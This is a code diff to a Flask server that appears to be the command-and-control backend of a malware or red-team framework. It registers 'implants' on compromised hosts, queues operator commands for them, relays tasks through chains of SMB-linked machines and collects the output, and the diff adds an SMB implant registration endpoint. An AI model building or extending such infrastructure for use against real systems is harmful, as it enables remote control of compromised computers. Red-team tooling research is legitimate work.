@@ -19,11 +19,11 @@ db = SQLAlchemy(app)
 
 # Schema definitions
 class Implant(db.Model):
-	ProductID = db.Column(db.String, primary_key=True)
-	OSName = db.Column(db.String, nullable=False)
-	OSBuild = db.Column(db.String, nullable=False)
-	Username = db.Column(db.String, nullable=False)
-	ComputerName = db.Column(db.String, nullable=False)
+	ComputerName = db.Column(db.String, primary_key=True)
+	ProductID = db.Column(db.String, nullable=True)
+	OSName = db.Column(db.String, nullable=True)
+	OSBuild = db.Column(db.String, nullable=True)
+	Username = db.Column(db.String, nullable=True)
 	last_checkin = db.Column(db.DateTime, nullable=False, default=datetime.utcnow)
 	creation_date = db.Column(db.DateTime, nullable=False, default=datetime.utcnow)
 
@@ -79,10 +79,10 @@ def login():
 	# Invalid login
 	return render_template('unauth.html')
 
-@app.route('/createtask/<ProductID>', methods=['POST'])
+@app.route('/createtask/<Hostname>', methods=['POST'])
 @flask_login.login_required
-def createtask(ProductID):
-	new_task = Task(cmd=flask.request.form['command'], implant_id=ProductID)
+def createtask(Hostname):
+	new_task = Task(cmd=flask.request.form['command'], implant_id=Hostname)
 	db.session.add(new_task)
 	db.session.commit()
 	return redirect('/monitor')
@@ -92,9 +92,8 @@ def get_tasks():
 	# Retrieve task	
 	task = Task.query.filter_by(status="Pending").first()
 	if(task is not None):
-		implant = Implant.query.filter_by(ProductID=task.implant_id).first()
 		# Generate path to host
-		hostname = implant.ComputerName
+		hostname = task.implant_id
 		path = [hostname]
 		parentRelationship = Adjacency.query.filter_by(ChildHostname=hostname).first()
 		while(parentRelationship is not None):
@@ -113,9 +112,7 @@ def get_tasks():
 @app.route('/taskupload', methods=['POST'])
 def task_response():
 	data = request.json
-	implant = Implant.query.filter_by(ComputerName=data['Hostname']).first()
-	pid = implant.ProductID
-	linkedTask = Task.query.filter_by(implant_id=pid, cmd=data['Command'], status="Issued").first()
+	linkedTask = Task.query.filter_by(implant_id=data['Hostname'], cmd=data['Command'], status="Issued").first()
 	linkedTask.output = data['Output']
 	linkedTask.status = "Complete"
 	db.session.commit()
@@ -127,8 +124,8 @@ def monitor():
 	implantlist = Implant.query.all()
 	templatelist = []
 	for implant in implantlist:
-		pending = Task.query.filter_by(implant_id=implant.ProductID, status="Pending").count()
-		templatelist.append((implant.ProductID, pending, implant.last_checkin, implant.creation_date))
+		pending = Task.query.filter_by(implant_id=implant.ComputerName, status="Pending").count()
+		templatelist.append((implant.ComputerName, pending, implant.last_checkin, implant.creation_date))
 	return render_template('monitor.html', implants=templatelist)
 
 @app.route('/register', methods=['POST'])
@@ -149,6 +146,18 @@ def register():
 		return flask.Response(response='Registered', status=200)
 	else:
 		return flask.Response(response='Previously registered', status=200)
+
+@app.route('/smbregister', methods=['POST'])
+def smbregister():
+	host = flask.request.form['hostname']
+	parent = flask.request.form['parent']
+	smbimplant = Implant(ComputerName=host)
+	relation = Adjacency(ParentHostname=parent, ChildHostname=host)
+	db.session.add(smbimplant)
+	db.session.add(relation)
+	db.session.commit()
+	return redirect('/monitor')
+
 	
 
 @app.route('/httpnode', methods=['GET'])
